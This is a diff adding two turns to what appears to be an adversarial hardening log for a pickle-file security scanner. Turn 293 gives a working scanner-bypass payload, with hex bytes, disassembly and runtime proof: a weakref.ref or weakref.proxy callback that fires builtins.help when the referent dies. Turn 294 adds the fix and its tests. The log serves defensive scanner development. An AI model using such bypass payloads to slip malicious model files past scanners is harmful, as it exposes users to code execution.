@@ -20277,3 +20277,163 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3893 passed, 1022 skipped, 21 warnings in 44.43s
 ```
+
+## Turn 293 - Bypass via `weakref` finalization callbacks
+
+Offensive turn after the Turn 292 `Future` defense. This is another finite
+stored-callback source, but the dispatch is tied to object lifetime instead of
+an explicit later method.
+
+Representative payload:
+
+```python
+weakref.ref(collections.UserList(), builtins.help)
+```
+
+`weakref.ref()` stores the callback without keeping the referent alive. In this
+pickle, the `UserList()` referent only exists as a temporary reducer argument,
+so CPython releases it as soon as the weakref is created. That finalization
+immediately invokes `builtins.help(weakref)`, which imports shadowable `pydoc`.
+
+Proof:
+
+```text
+payload_len 64
+payload_hex 80048c077765616b7265668c0372656693288c0b636f6c6c656374696f6e738c08557365724c6973749329528c086275696c74696e738c0468656c709374522e
+
+0: PROTO              4
+16: STACK_GLOBAL       # weakref.ref
+18: STACK_GLOBAL       # collections.UserList
+43: REDUCE             # UserList()
+60: STACK_GLOBAL       # builtins.help callback
+61: TUPLE              # (UserList(), help)
+62: REDUCE             # weakref.ref(...), then referent dies and invokes help(ref)
+63: STOP
+```
+
+Scanner proof:
+
+```text
+scan clean findings 0 errors ()
+imports [
+  ('weakref', 'ref', 16, False),
+  ('collections', 'UserList', 41, False),
+  ('builtins', 'help', 60, False),
+]
+invocations [
+  ('collections', 'UserList', 0, None),
+  ('weakref', 'ref', 2, None),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type ReferenceType
+runtime_result <weakref at ...; dead>
+weakref_alive False
+marker_exists True
+marker_text owned-by-weakref-rce
+```
+
+Lifetime boundary:
+
+```text
+obj = collections.UserList()
+ref = weakref.ref(obj, builtins.help)
+(obj, ref)
+
+scan clean findings 0
+runtime_type tuple
+weakref_alive True
+same True
+marker_exists False
+```
+
+Sibling:
+
+```text
+weakref.proxy(collections.UserList(), builtins.help)
+scan clean findings 0
+runtime_type ProxyType
+marker_exists True
+```
+
+Why it bypasses:
+
+- `weakref.ref` and `weakref.proxy` are clean import references; only
+  `weakref.finalize` had already been blocked in earlier probing.
+- The scanner records the constructor call but does not model weakref callback
+  dispatch when the referent dies.
+- The Python call graph cannot see the dispatch because the callback is invoked
+  by weakref object lifetime semantics, not by a direct Python call edge.
+
+Likely source-level defense:
+
+- Add finite callback-dispatch rows for `weakref.ref(obj, callback)` and
+  `weakref.proxy(obj, callback)` with one callback positional argument.
+- A conservative source fix can synthesize the callback whenever the second
+  argument is a tracked callable; weakref callbacks can execute at unpredictable
+  finalization time.
+- A more precise model could track whether the referent is known memo-backed and
+  returned alive, but that requires lifetime state beyond the current callback
+  receiver shapes. The fail-closed row is small and close to the source.
+
+Performance note:
+
+- The representative payload is 64 bytes.
+- Warm scan timing over 1000 clean bypass scans was median `0.000035s`, p95
+  `0.000040s`, and max `0.000448s`.
+
+## Turn 294 - Block `weakref.ref/proxy` callback dispatch
+
+Defensive turn for Turn 293. The source fix is deliberately small: model the
+finite callback-bearing constructor forms instead of adding package-specific
+denylist entries.
+
+Implementation:
+
+- Added an unconditional callback-dispatch guard in the Rust stack model.
+- Registered exact two-argument `weakref.ref(obj, callback)` and
+  `weakref.proxy(obj, callback)` rows with a synthesized one-argument callback
+  invocation.
+- Kept one-argument `weakref.ref(obj)` and `weakref.proxy(obj)` clean.
+
+Regression coverage:
+
+```text
+weakref.ref(collections.UserList(), builtins.help)
+weakref.proxy(collections.UserList(), builtins.help)
+```
+
+Both now record a `builtins.help` callable invocation with one positional
+argument, which lets the existing Python call-graph pass flag
+`_sitebuiltins._Helper.__call__ -> builtins.__import__`.
+
+The negative coverage checks the no-callback forms remain clean.
+
+Validation:
+
+```text
+cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml
+ok
+
+RUSTFLAGS="-C link-arg=-undefined -C link-arg=dynamic_lookup" cargo build --manifest-path packages/modelaudit-picklescan/Cargo.toml --release --features extension-module,abi3
+finished release build
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q -k "weakref_lifetime_callback or weakref_without_callback"
+4 passed, 178 deselected
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+182 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+220 passed
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3897 passed, 1022 skipped, 21 warnings in 39.63s
+```
